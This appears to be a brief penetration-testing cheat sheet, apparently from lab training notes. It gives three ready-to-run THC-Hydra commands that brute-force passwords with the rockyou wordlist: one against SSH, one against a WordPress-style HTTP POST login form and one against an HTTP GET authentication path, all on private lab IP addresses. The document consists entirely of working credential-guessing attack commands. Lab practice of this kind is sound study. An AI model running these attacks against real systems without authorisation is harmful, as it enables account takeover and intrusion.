
### SSH Attack with THC-Hydra

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt 10.2.2.150 ssh
```

### HTTP POST Attack with THC-Hydra

```bash
hydra 192.168.237.52 http-form-post "/form/frontpage.php:log=offsec&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.237.52%2Fwp-admin%2F&testcookie=1:Unknown username." -L users.txt -P /usr/share/wordlists/rockyou.txt -vV 
```

```bash
hydra -l offsec -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.237.52 http-get /manual
```